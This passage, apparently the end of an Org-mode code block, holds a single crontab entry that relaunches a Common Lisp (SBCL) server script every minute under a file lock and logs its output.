  ,*/1 * * * * export DISPLAY=:0 && cd ~/quicklisp/ && flock -xn ./srv.lock sbcl --load ./srv.lisp > ./log.txt
#+END_SRC
